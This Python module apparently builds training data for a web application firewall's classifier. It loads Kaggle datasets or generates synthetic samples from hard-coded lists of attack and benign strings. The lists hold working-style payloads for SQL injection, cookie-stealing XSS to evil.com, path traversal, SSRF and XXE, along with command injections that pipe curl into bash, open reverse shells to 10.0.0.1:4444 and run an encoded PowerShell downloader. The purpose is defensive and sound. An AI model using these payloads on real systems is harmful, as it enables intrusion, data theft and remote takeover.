import logging
import random
import urllib.parse
import numpy as np
import pandas as pd
from pathlib import Path

logger = logging.getLogger('ml_engine')

KAGGLE_DATASETS = {
    'sqli': {
        'slug': 'syedsaqlainhussain/sql-injection-dataset',
        'file': 'SQL Injection.csv',
        'text_col': 'Sentence',
        'label_col': 'Label',
    },
    'xss': {
        'slug': 'syedsaqlainhussain/xss-dataset-for-deep-learning',
        'file': 'XSS_dataset.csv',
        'text_col': 'Sentence',
        'label_col': 'Label',
    },
    'web_attacks': {
        'slug': 'dhoogla/cicids2018',
        'file': 'Friday-02-03-2018_TrafficForML_CICFlowMeter.csv',
        'text_col': None,
        'label_col': 'Label',
    },
}


def download(key: str, out_dir: Path) -> bool:
    try:
        import kaggle
        if key not in KAGGLE_DATASETS:
            logger.warning(f'Unknown dataset key: {key}')
            return False
        info = KAGGLE_DATASETS[key]
        out_dir.mkdir(parents=True, exist_ok=True)
        kaggle.api.authenticate()
        kaggle.api.dataset_download_files(info['slug'], path=str(out_dir), unzip=True, quiet=False)
        logger.info(f'Downloaded {key}')
        return True
    except Exception as e:
        logger.error(f'Download failed [{key}]: {e}')
        return False


SQLI_ATTACKS = [
    "1' OR '1'='1", "admin'--", "1'; DROP TABLE users--",
    "' UNION SELECT username,password FROM users--",
    "1 AND SLEEP(5)--", "' OR 1=1#", "1' ORDER BY 3--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
    "1; INSERT INTO users VALUES ('hacked','pass')--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    "'; EXEC xp_cmdshell('dir')--",
    "1 AND 1=1 UNION SELECT table_name FROM information_schema.tables--",
    "admin') OR ('1'='1",
    "1' GROUP BY 1--",
    "' HAVING 1=1--",
    "1 ORDER BY (SELECT 1 FROM(SELECT(SLEEP(5)))x)--",
    "'; EXEC sp_executesql N'SELECT 1'--",
    "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'",
    "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",
    "1' AND BENCHMARK(5000000,MD5('x'))--",
    "'; DROP DATABASE test--",
]

SQLI_BENIGN = [
    "SELECT option from dropdown", "search=hello world",
    "username=john&password=secret123", "id=42",
    "SELECT your seat", "UPDATE your profile",
    "FROM here to there", "WHERE are you going",
    "order by name", "group by category",
    "q=python tutorial", "page=1&limit=20",
    "sort=asc&filter=active", "user_id=100",
    "product=laptop&color=black",
]

XSS_ATTACKS = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:eval(atob("YWxlcnQoMSk="))',
    '" onmouseover="alert(document.cookie)',
    '<svg/onload=alert(1)>',
    '"><script>fetch("http://evil.com?c="+document.cookie)</script>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<math><mi xlink:href="javascript:alert(1)">',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    '" onfocus="window.location=\'http://evil.com\'" autofocus="',
    "<script>document.write('<img src=http://evil.com?c='+document.cookie+'>')</script>",
    '<input type="text" value="` + alert(1) + `">',
    "';alert(String.fromCharCode(88,83,83))//",
    '<details/open/ontoggle=alert(1)>',
    '<video><source onerror="alert(1)">',
    'expression(alert(1))',
    '<style>@import"javascript:alert(1)"</style>',
    '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
]

XSS_BENIGN = [
    'Hello <b>world</b>', 'Click <a href="/home">here</a>',
    'Price: $42.99', 'User: John & Jane',
    '<p>Normal paragraph</p>', 'comment=Nice article!',
    'name=Alice&age=30', 'search=python tutorial',
    'text=Hello World', 'message=Thank you',
    '<h1>Title</h1>', '<br> line break',
    'contact form submission', 'feedback=Great service!',
    '5 > 3 and 2 < 4',
]

PATH_ATTACKS = [
    '../etc/passwd', '../../etc/shadow',
    '%2e%2e%2fetc%2fpasswd', '%252e%252e%252fetc%252fshadow',
    '....//....//etc/passwd', '../windows/system32/config/sam',
    '..\\..\\windows\\win.ini', '%2e%2e%5cwindows%5csystem32',
    '/var/www/html/../../../etc/passwd',
    '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/api/v1/../../etc/hosts',
    '../../../proc/self/environ',
    '..%c0%afetc%c0%afpasswd',
    '%c0%ae%c0%ae/etc/passwd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '../../../var/log/apache2/access.log',
    '..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
    '/etc/passwd%00',
    '/proc/self/fd/0',
    '/../../../boot.ini',
]

PATH_BENIGN = [
    '/index.html', '/about', '/contact', '/api/users',
    '/images/logo.png', '/css/style.css', '/js/app.js',
    '/login', '/dashboard', '/products/1', '/blog/post-1',
    '/user/profile', '/search?q=hello', '/api/v1/data',
    '/static/main.js', '/uploads/avatar.jpg',
]

RCE_ATTACKS = [
    '; ls -la /etc',
    '| cat /etc/passwd',
    '`whoami`',
    '$(id)',
    '&& uname -a',
    '; wget http://malicious.com/shell.sh -O /tmp/shell.sh',
    '| curl -s http://evil.com/backdoor | bash',
    '; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    '|| netstat -an | grep LISTEN',
    '; python3 -c "import os;os.system(\'id\')"',
    '& whoami /all',
    '; net user hacker Password123! /add',
    '| dir C:\\Users',
    '& type C:\\windows\\system32\\drivers\\etc\\hosts',
    '; ping -c 4 attacker.com',
    '$(cat /etc/shadow)',
    '; chmod 777 /etc/passwd',
    '`curl http://evil.com/$(whoami)`',
    '; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.0.0.1\',4444))"',
    '| powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=',
    '; nc -e /bin/bash 10.0.0.1 4444',
    '&& cat /proc/version',
    '; php -r "system(\'id\');"',
    '; perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))\'',
    '$(nslookup attacker.com)',
]

RCE_BENIGN = [
    'ip=8.8.8.8', 'host=example.com', 'ping_count=4',
    'command=status', 'action=restart', 'service=nginx',
    'server=web01', 'target=localhost', 'port=80',
    'cmd=help', 'run=tests', 'exec_id=12345',
    'process=worker', 'task=backup', 'job=cron',
]

DDOS_BOT_UA = [
    'python-requests/2.28.0', 'Go-http-client/1.1',
    'curl/7.81.0', '', 'flood-bot/1.0',
    'masscan/1.0', 'zgrab/0.x', 'DDoS-tool',
    'Apache-HttpClient/4.5.13', 'libwww-perl/6.07',
    'Wget/1.21', 'aria2/1.36', 'httpie/3.2',
    'aiohttp/3.8', 'requests-bot', 'scanner/1.0',
]

DDOS_NORMAL_UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
]

SSRF_ATTACKS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://localhost:8080/admin',
    'http://127.0.0.1/server-status',
    'http://127.0.0.1:6379/',
    'http://0.0.0.0:8000/admin',
    'file:///etc/passwd',
    'file:///etc/shadow',
    'dict://localhost:11211/stat',
    'gopher://localhost:25/xHELO%20localhost',
    'http://[::1]/admin',
    'http://2130706433/',
    'http://0177.0.0.1/',
    'http://192.168.1.1/admin',
    'http://10.0.0.1:8080/api',
    'http://172.16.0.1/internal',
    'http://metadata.google.internal/',
    'http://100.100.100.200/latest/meta-data/',
]

SSRF_BENIGN = [
    'http://example.com', 'https://api.github.com/users',
    'https://httpbin.org/get', 'http://google.com',
    'url=https://cdn.example.com/image.jpg',
    'callback=https://webhooks.example.com/notify',
    'redirect=/dashboard', 'next=/home',
    'source=https://feeds.example.com/rss',
    'endpoint=https://api.stripe.com/v1',
]

XXE_ATTACKS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/shadow"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]><data/>',
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "http://attacker.com/xxe">]><data>&ent;</data>',
    '<!DOCTYPE test [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo/>',
    '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
]

XXE_BENIGN = [
    '<?xml version="1.0"?><user><name>John</name></user>',
    '<root><item>value</item></root>',
    '<?xml version="1.0" encoding="UTF-8"?><request><id>123</id></request>',
    '<data><field1>hello</field1><field2>world</field2></data>',
    '<config><debug>false</debug></config>',
    '<person><name>Alice</name><age>30</age></person>',
]


def build_synthetic(target_type: str, n: int = 12000) -> pd.DataFrame:
    attack_map = {
        'sqli': (SQLI_ATTACKS, SQLI_BENIGN),
        'xss': (XSS_ATTACKS, XSS_BENIGN),
        'path_traversal': (PATH_ATTACKS, PATH_BENIGN),
        'rce': (RCE_ATTACKS, RCE_BENIGN),
        'ddos': (DDOS_BOT_UA, DDOS_NORMAL_UA),
        'ssrf': (SSRF_ATTACKS, SSRF_BENIGN),
        'xxe': (XXE_ATTACKS, XXE_BENIGN),
    }

    attacks, benign = attack_map.get(target_type, ([], []))
    if not attacks:
        raise ValueError(f'No synthetic data for: {target_type}')

    rows = []
    half = n // 2
    for _ in range(half):
        rows.append({'text': random.choice(attacks), 'label': 1, 'attack_type': target_type})
    for _ in range(half):
        rows.append({'text': random.choice(benign), 'label': 0, 'attack_type': target_type})

    df = pd.DataFrame(rows)
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    return df


def load_sqli(datasets_dir: Path) -> pd.DataFrame:
    p = datasets_dir / 'sqli' / 'SQL Injection.csv'
    if p.exists():
        try:
            df = pd.read_csv(p, encoding='utf-8', on_bad_lines='skip')
            df = df.dropna(subset=['Sentence', 'Label'])
            df['label'] = df['Label'].astype(int)
            df['text'] = df['Sentence'].astype(str)
            df['attack_type'] = 'sqli'
            logger.info(f'Loaded SQLi from CSV: {len(df)} rows')
            return df[['text', 'label', 'attack_type']]
        except Exception as e:
            logger.warning(f'CSV load failed: {e}')
    return build_synthetic('sqli', 14000)


def load_xss(datasets_dir: Path) -> pd.DataFrame:
    p = datasets_dir / 'xss' / 'XSS_dataset.csv'
    if p.exists():
        try:
            df = pd.read_csv(p, encoding='utf-8', on_bad_lines='skip')
            df = df.dropna(subset=['Sentence', 'Label'])
            df['label'] = df['Label'].astype(int)
            df['text'] = df['Sentence'].astype(str)
            df['attack_type'] = 'xss'
            logger.info(f'Loaded XSS from CSV: {len(df)} rows')
            return df[['text', 'label', 'attack_type']]
        except Exception as e:
            logger.warning(f'CSV load failed: {e}')
    return build_synthetic('xss', 14000)


def load_path_traversal(datasets_dir: Path) -> pd.DataFrame:
    return build_synthetic('path_traversal', 12000)


def load_rce(datasets_dir: Path) -> pd.DataFrame:
    return build_synthetic('rce', 12000)


def load_ddos(datasets_dir: Path) -> pd.DataFrame:
    return build_synthetic('ddos', 12000)


def load_ssrf(datasets_dir: Path) -> pd.DataFrame:
    return build_synthetic('ssrf', 10000)


def load_xxe(datasets_dir: Path) -> pd.DataFrame:
    return build_synthetic('xxe', 8000)


LOADERS = {
    'sqli': load_sqli,
    'xss': load_xss,
    'path_traversal': load_path_traversal,
    'rce': load_rce,
    'ddos': load_ddos,
    'ssrf': load_ssrf,
    'xxe': load_xxe,
}


def df_to_features(df: pd.DataFrame) -> np.ndarray:
    from waf_core.features import extract_features

    rows = []
    for _, row in df.iterrows():
        text = str(row['text'])
        atype = str(row.get('attack_type', 'unknown'))
        label = int(row.get('label', 0))

        method = 'GET'
        path = '/test'
        qs = ''
        body = ''
        headers = {'HTTP_USER_AGENT': random.choice(DDOS_NORMAL_UA)}

        if atype == 'sqli' and label == 1:
            qs = urllib.parse.urlencode({'id': text})
            path = '/api/users'
        elif atype == 'xss' and label == 1:
            if random.random() < 0.5:
                qs = urllib.parse.urlencode({'q': text})
            else:
                body = urllib.parse.urlencode({'comment': text})
                method = 'POST'
                headers['CONTENT_TYPE'] = 'application/x-www-form-urlencoded'
            path = '/search'
        elif atype == 'path_traversal' and label == 1:
            path = text if text.startswith('/') else f'/{text}'
        elif atype == 'rce' and label == 1:
            qs = urllib.parse.urlencode({'host': f'127.0.0.1{text}'})
            path = '/api/ping'
        elif atype == 'ddos' and label == 1:
            headers['HTTP_USER_AGENT'] = text
            path = '/api/data'
        elif atype == 'ssrf' and label == 1:
            qs = urllib.parse.urlencode({'url': text})
            path = '/api/fetch'
        elif atype == 'xxe' and label == 1:
            body = text
            method = 'POST'
            headers['CONTENT_TYPE'] = 'application/xml'
            path = '/api/upload'
        else:
            if text.startswith('/'):
                path = text[:200]
            elif '=' in text:
                qs = text[:500]
            else:
                body = text[:500]

        feats = extract_features(method, path, qs, headers, body, '1.2.3.4')
        rows.append(feats)

    return np.array(rows, dtype=np.float32)
